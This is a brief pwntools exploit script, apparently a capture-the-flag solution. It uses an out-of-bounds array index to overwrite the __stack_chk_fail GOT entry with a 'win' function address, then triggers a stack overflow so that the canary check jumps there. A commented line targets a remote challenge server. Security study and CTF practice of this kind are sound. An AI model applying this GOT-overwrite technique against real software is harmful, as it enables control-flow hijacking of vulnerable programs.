from pwn import *

elf = ELF('./chall')
io = process(elf.path)
#io = remote('34.170.146.252', 46202)

array_address = 0x404080
idx = (elf.got['__stack_chk_fail'] - array_address) // 8
log.info(f"__stack_chk_fail@GOT address: {hex(elf.got['__stack_chk_fail'])}")
log.info(f'idx: {idx}')

io.sendlineafter(b'index: ', str(idx).encode() + b'a' * 0x100)
io.sendlineafter(b'value: ', str(elf.sym['win']).encode())

io.interactive()
